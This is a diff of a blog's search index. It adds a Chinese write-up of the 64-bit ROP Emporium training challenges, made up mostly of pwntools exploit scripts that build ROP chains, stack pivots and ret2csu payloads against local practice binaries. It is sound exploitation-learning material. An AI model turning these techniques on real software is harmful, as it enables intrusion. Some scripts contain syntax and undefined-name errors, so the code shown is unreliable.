@@ -21,6 +21,82 @@
 ]]></content>
   </entry>
   <entry>
+    <title></title>
+    <url>/2025/02/14/ROP%20Emporium%EF%BC%8864%EF%BC%89%20WP/</url>
+    <content><![CDATA[<h1 id="ROP-Emporium（64）-WP"><a href="#ROP-Emporium（64）-WP" class="headerlink" title="ROP Emporium（64） WP"></a>ROP Emporium（64） WP</h1><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h2><p>找到后门函数ret2win的地址，利用缓冲区溢出覆盖返回地址</p>
+<p>exp</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h2><p>与ret2win大致相同，只不过这题将后门执行的命令由<code>cat flag</code>改为了<code>/bin/ls</code>，因此不能直接获取flag，但程序中给出了<code>/bin/cat flag.txt</code>这个字符串，所以只需要构造简单的ROP链就可以获取flag<img src="https://p.sda1.dev/22/d0fbba4df9c580e19acafa6f97dde4a1/image-20250214095002976.png" alt="image-20250214095002976.png"><img src="https://p.sda1.dev/22/a535261d95bc230a50941ba1fb3ea46b/image-20250214095031390.png" alt="image-20250214095031390.png">直接使用gadget将参数pop到rdi中即可。</p>
+<p>exp</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">rdi = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*(<span class="number">32</span> + <span class="number">8</span>) + p64(rdi) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h2><p>与第二题类似，通过ROPgadget找到对应gadget地址为0x40093c。<img src="https://p.sda1.dev/22/1cb41ee50c7c5fcaeaa5e33ef07c56c9/image-20250214100130272.png">题目里的usefulfunction也给了提示，就是让我们连续调用三个函数，并用正确的顺序和参数调用<img src="https://p.sda1.dev/22/10ea289a8a1c2305ecd3385d744cba2a/image-20250214101459928.png"></p>
+<p>然后直接构造payload即可</p>
+<p>exp</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./callme&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">one</span> = <span class="number">0</span><span class="variable">x400720</span></span><br><span class="line"><span class="variable">two</span> = <span class="number">0</span><span class="variable">x400740</span></span><br><span class="line"><span class="variable">three</span> = <span class="number">0</span><span class="variable">x4006f0</span></span><br><span class="line"><span class="variable">ret</span> = <span class="number">0</span><span class="variable">x40093c</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;A&#x27;</span> *<span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">one</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">two</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">three</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h2><p>用ida分析给出来的几个文件，发现libc中的print_file函数是个可以打印文件内容的函数，那这题就是用栈溢出，跳转到print_file函数去获取到flag。因此，主要是利用两个gadget来实现写字符串到data段。![image-20250214104036505](ROP Emporium（64） WP.assets&#x2F;image-20250214104036505.png)![image-20250214104227536](ROP Emporium（64） WP.assets&#x2F;image-20250214104227536.png)</p>
+<p>得到pop_r14_r15 &#x3D; 0x400690</p>
+<p>![image-20250214104448963](ROP Emporium（64） WP.assets&#x2F;image-20250214104448963.png)</p>
+<p>得到mov_r14_r15 &#x3D; 0x400628</p>
+<p>ida下拉找到data段地址![image-20250214104743879](ROP Emporium（64） WP.assets&#x2F;image-20250214104743879.png)构造exp</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./write4&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">bss</span> = <span class="number">0</span><span class="variable">x601038</span></span><br><span class="line"><span class="variable">mov_r14_r15</span> = <span class="number">0</span><span class="variable">x400628</span></span><br><span class="line"><span class="variable">pop_r14_r15</span> = <span class="number">0</span><span class="variable">x400690</span></span><br><span class="line"><span class="variable">print_file</span> = <span class="number">0</span><span class="variable">x400510</span></span><br><span class="line"><span class="variable">data</span> = <span class="number">0</span><span class="variable">x601028</span></span><br><span class="line"><span class="variable">pop_rdi</span> = <span class="number">0</span><span class="variable">x400693</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;a&#x27;</span>* <span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">pop_r14_r15</span>)+<span class="title">p64</span>(<span class="variable">bss</span>+<span class="string">&quot;flag.txt&quot;</span>+<span class="title">p64</span>(<span class="variable">mov_r14_r15</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">pop_rdi</span>) + <span class="title">p64</span>(<span class="variable">bss</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">print_file</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>() </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h2><p>与上一题基本一致，不过pwnme函数中添加了一个检查，不允许出现x，a，g，.</p>
+<p>![image-20250214110834422](ROP Emporium（64） WP.assets&#x2F;image-20250214110834422.png)</p>
+<p>仍旧有提供print_file的链接，可以调用这个函数。</p>
+<p>![image-20250214110642874](ROP Emporium（64） WP.assets&#x2F;image-20250214110642874.png)![image-20250214110815887](ROP Emporium（64） WP.assets&#x2F;image-20250214110815887.png)然后我们发现usefulfunction底下还有个usefulgadgets，可以让我们进行异或操作![image-20250214111659502](ROP Emporium（64） WP.assets&#x2F;image-20250214111659502.png)</p>
+<p>那么思路就是对flag.txt字符串进行异或，绕过限制，然后调整r14和r15指针，去逐个异或，然后跳转到print_file</p>
+<p>exp</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./badchars&#x27;)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = 0x400628</span><br><span class="line">add_r14r15 = 0x40062c</span><br><span class="line">sub_r14r15 = 0x400630</span><br><span class="line">mov_r12r13 = 0x400634</span><br><span class="line">pop_r12r13r14r15 = 0x40069c</span><br><span class="line">pop_r14r15 = 0x4006a0</span><br><span class="line">pop_rdi = 0x4006a3</span><br><span class="line">write_addr = 0x601030</span><br><span class="line"></span><br><span class="line">badchars = &#x27;xag.&#x27;</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 40</span><br><span class="line">payload += p64(pop_r12r13r14r15) + b&#x27;flbh/tyt&#x27; + p64(write_addr) + p64(1) + p64(write_addr + 2)		</span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[&#x27;print_file&#x27;])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6.fluff"></a>6.fluff</h2><p>这题和上题唯一的区别就是给的gadget不同，变成了questionableGadgets，底下三个没见过的指令![image-20250214112129447](ROP Emporium（64） WP.assets&#x2F;image-20250214112129447.png)查一下</p>
+<p>xlat指令：将[rbx+al]的值赋值给al</p>
+<p>stosb指令：将al赋值给[rdi]</p>
+<p>bextr：位域索引，第一个源操作数是原数据，第二个源操作数是索引开始位置（8位）和长度，这里可以控制rbx的值</p>
+<p>然后再找到这两个gadget</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004006a3</span> : <span class="keyword">pop</span> <span class="built_in">rdi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000000400639</span> : <span class="keyword">stosb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>
+
+<p>能够将寄存器的值赋值到内存中的只有stosb指令，我们有pop rdi; ret的gadget，因此可以控制stosb指令将al的值写到哪里。而xlat可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样就可以通过修改rbx 来修改al。</p>
+<p>exp</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">xlat</span> = <span class="number">0x400628</span></span><br><span class="line"><span class="keyword">bextr</span> = <span class="number">0x40062A</span></span><br><span class="line"><span class="keyword">stosb</span> = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span>			</span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line"><span class="built_in">rdi</span> = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line">char = [ord(x) for x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line">print(char)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)			</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)		</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)	</span><br><span class="line">	payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">	payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)</span><br><span class="line">payload += p64(elf<span class="number">.</span>plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h2><p>是一道栈迁移的题目</p>
+<p>找到经典usefulgadgets![image-20250214113945044](ROP Emporium（64） WP.assets&#x2F;image-20250214113945044.png)</p>
+<p>通过mov rax, [rax]我们能够控制rax的值，就可以将任意地址的值写入到rax中</p>
+<p>上面的uselessfunction还提供了提供了_foothold_function函数，在so库中查看![image-20250214114742265](ROP Emporium（64） WP.assets&#x2F;image-20250214114742265.png)发现没什么用，但是可以用于延迟绑定后提供该so库的地址泄露</p>
+<p>后门函数同上是ret2win</p>
+<p>所以思路就是覆盖rbp，跳转到leave ret完成迁移，执行_foothold_function函数，打印got表，泄露地址，拿到ret2win的地址，返回pwnme，调用ret2win</p>
+<p>exp</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pivot&#x27;)</span><br><span class="line">lib = ELF(&#x27;./libpivot.so&#x27;)</span><br><span class="line"></span><br><span class="line">rax = 0x4009bb</span><br><span class="line">rsp = 0x4009bd</span><br><span class="line">rax_addr = 0x4009c0</span><br><span class="line">add_rax = 0x4009c4</span><br><span class="line">jmp_rax = 0x4007c1</span><br><span class="line">main_addr = 0x400847</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;place to pivot: 0x&#x27;)</span><br><span class="line">stack = int(p.recv(12).decode(), 16)</span><br><span class="line">payload = p64(elf.plt[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(elf.got[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax_addr)		</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line">payload = b&#x27;a&#x27;*32	</span><br><span class="line">payload += p64(lib.symbols[&#x27;ret2win&#x27;] - lib.symbols[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(stack)	</span><br><span class="line">payload += p64(rsp)						</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h2><p>仍旧有后门函数ret2win![image-20250214132031877](ROP Emporium（64） WP.assets&#x2F;image-20250214132031877.png)只要三个参数符合要求即可</p>
+<p>在这个片段我们可以控制一系列寄存器的值![image-20250214132401399](ROP Emporium（64） WP.assets&#x2F;image-20250214132401399.png)再用ROPgadgets查找![image-20250214132609643](ROP Emporium（64） WP.assets&#x2F;image-20250214132609643.png)</p>
+<p>发现pop rdi; ret实际上是将原来的pop r15指令拆掉了，上面的pop rsi, ret也一样</p>
+<p>第三个函数参数在rdx中保存，但我们没办法rdx，这就用到第二个片段了![image-20250214133130717](ROP Emporium（64） WP.assets&#x2F;image-20250214133130717.png)但是对edi的赋值出现了一点问题，mov edi, r13d只赋值四个字节，高4字节赋值不了，而我们找到一个片段</p>
+<p>它将rsp减8又加8![image-20250214141115280](ROP Emporium（64） WP.assets&#x2F;image-20250214141115280.png)我们试试看，但还需要在内存空间中找到一个保存着这个代码段地址的地方，因为call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，还真有</p>
+<p>![image-20250214134158024](ROP Emporium（64） WP.assets&#x2F;image-20250214134158024.png)</p>
+<p>这里rbp和rbx都是之前控制的，我们需要让这个跳转不成立，就需要rbx+1&#x3D;&#x3D;rbp的值</p>
+<p>完成之后，再rsp+8，pop6个值之后就是下一个返回地址，这样就可以跳过call直接返回,来修改rdi的值，从这里去修改rdi为目标值，然后跳转去win函数即可。![image-20250214144108583](ROP Emporium（64） WP.assets&#x2F;image-20250214144108583.png)</p>
+<p>exp</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span> = process(&#x27;./ret2csu&#x27;)</span><br><span class="line"><span class="attribute">lib</span> = ELF(&#x27;./libret2csu.so&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">ROP_1</span> = <span class="number">0</span>x40069a</span><br><span class="line"><span class="attribute">ROP_2</span> = <span class="number">0</span>x400680</span><br><span class="line"><span class="attribute">rdi</span> = <span class="number">0</span>x4006a3</span><br><span class="line"><span class="attribute">call</span> = <span class="number">0</span>x400689</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span> = b&#x27;a&#x27;*<span class="number">40</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_1)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>x4003B0) + p64(<span class="number">0</span>xdeadbeefdeadbeef) + p64(<span class="number">0</span>xcafebabecafebabe) + p64(<span class="number">0</span>xd00df00dd00df00d)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_2)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef) </span><br><span class="line"><span class="attribute">payload</span> += p64(elf.plt[&#x27;ret2win&#x27;])</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>pwn之旅 （一）</title>
     <url>/2024/11/08/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%B8%80%EF%BC%89/</url>
     <content><![CDATA[<h1 id="pwn之旅（一）"><a href="#pwn之旅（一）" class="headerlink" title="pwn之旅（一）"></a>pwn之旅（一）</h1><h2 id="一、ELF文件以及前置知识"><a href="#一、ELF文件以及前置知识" class="headerlink" title="一、ELF文件以及前置知识"></a>一、ELF文件以及前置知识</h2><h3 id="1-关键名词"><a href="#1-关键名词" class="headerlink" title="1.关键名词"></a>1.关键名词</h3><p>exploit：用于攻击的脚本与方案</p>
@@ -67,6 +143,18 @@
 ]]></content>
   </entry>
   <entry>
+    <title>pwn之旅 （二）</title>
+    <url>/2024/11/16/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="pwn之旅（二）"><a href="#pwn之旅（二）" class="headerlink" title="pwn之旅（二）"></a>pwn之旅（二）</h1><h2 id="一、初识GDB"><a href="#一、初识GDB" class="headerlink" title="一、初识GDB"></a>一、初识GDB</h2><p>1.设置断点 b（任意字母） *xxxxxxxx（地址）</p>
+<p> i b（对应字母）步入</p>
+<p>2.ni 单步</p>
+<p>3.i r 观察寄存器的值</p>
+<p>4.disassemble xxxxx（如$rip） 反编译</p>
+<p>5.j（xx）汇编指令</p>
+<p><img src="/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89.assets/jcc.png" alt="jcc"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>博客搭建</title>
     <url>/2024/10/12/%E6%96%87%E7%AB%A0/</url>
     <content><![CDATA[<h1 id="搭建心路"><a href="#搭建心路" class="headerlink" title="搭建心路"></a>搭建心路</h1><span id="more"></span>
@@ -95,24 +183,9 @@
 ]]></content>
   </entry>
   <entry>
-    <title>编程作业1</title>
+    <title>整数溢出</title>
     <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A1/</url>
-    <content><![CDATA[<h2 id="1、【程序文件名】zy1-1-cpp"><a href="#1、【程序文件名】zy1-1-cpp" class="headerlink" title="1、【程序文件名】zy1-1.cpp"></a>1、【程序文件名】zy1-1.cpp</h2><p>【题目描述】编写一个程序，功能是：输入一个3位的正整数，逆序输出。如输入：345，则输出：543，输入：530，则输出：035。</p>
-<span id="more"></span>
-
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> a，b，c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c%c%c&quot;</span>, &amp;a，&amp;b，&amp;c）;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>, a, b, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2、【程序文件名】zy1-2-cpp"><a href="#2、【程序文件名】zy1-2-cpp" class="headerlink" title="2、【程序文件名】zy1-2.cpp"></a>2、【程序文件名】zy1-2.cpp</h2><p>【题目描述】编写一个程序，功能是：输入一个字母，若是大写字母直接输出，若输入小写字母输出它对应的大写字母。如输入：B，则输出：B，输入：d，则输出：D。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> letter;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;letter);</span><br><span class="line">    <span class="type">char</span> result = (letter &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; letter &lt;= <span class="string">&#x27;z&#x27;</span>) ? (letter - <span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;A&#x27;</span>) : letter;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3、【程序文件名】zy1-3-cpp"><a href="#3、【程序文件名】zy1-3-cpp" class="headerlink" title="3、【程序文件名】zy1-3.cpp"></a>3、【程序文件名】zy1-3.cpp</h2><p>【题目描述】编写一个程序，功能是：输入一个正整数（占4个字节），输出右边第2字节的值。如输入：255，则输出：0；输入：256，输出：1；输入：16666，输出：65。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> num;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;num);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> second_byte = (num &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>, second_byte);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>编程作业2</title>
@@ -128,7 +201,6 @@
 <h3 id="3、【程序文件名】zy-3-cpp"><a href="#3、【程序文件名】zy-3-cpp" class="headerlink" title="3、【程序文件名】zy-3.cpp"></a>3、【程序文件名】zy-3.cpp</h3><p>【题目描述】编写一个程序，功能是：输入一个年份，判断它是否为闰年。其中，闰年的年份满足以下两个条件之一：一是能被400整除；二是能被4整除，但不能被100整除。如输入：2024，则输出：Y；输入：2022，输出：N。</p>
 <p>  要求：使用条件运算符，不使用if语句。</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;year);</span><br><span class="line">    <span class="type">char</span> isLeapYear = (year % <span class="number">400</span> == <span class="number">0</span> || (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>)) ? <span class="string">&#x27;Y&#x27;</span> : <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, isLeapYear);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 ]]></content>
   </entry>
   <entry>
@@ -148,18 +220,6 @@
 <h2 id="4、【程序文件名】zy2-4-cpp"><a href="#4、【程序文件名】zy2-4-cpp" class="headerlink" title="4、【程序文件名】zy2-4.cpp"></a>4、【程序文件名】zy2-4.cpp</h2><p>【题目描述】编写一程序，功能是：求1~n中所有偶数之和，其中，n由键盘输入。例如：输入：10，输出：30；输入：50，输出：650；输入：100，输出：2550。</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i += <span class="number">2</span>) &#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>pwn之旅 （二）</title>
-    <url>/2024/11/16/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="pwn之旅（二）"><a href="#pwn之旅（二）" class="headerlink" title="pwn之旅（二）"></a>pwn之旅（二）</h1><h2 id="一、初识GDB"><a href="#一、初识GDB" class="headerlink" title="一、初识GDB"></a>一、初识GDB</h2><p>1.设置断点 b（任意字母） *xxxxxxxx（地址）</p>
-<p> i b（对应字母）步入</p>
-<p>2.ni 单步</p>
-<p>3.i r 观察寄存器的值</p>
-<p>4.disassemble xxxxx（如$rip） 反编译</p>
-<p>5.j（xx）汇编指令</p>
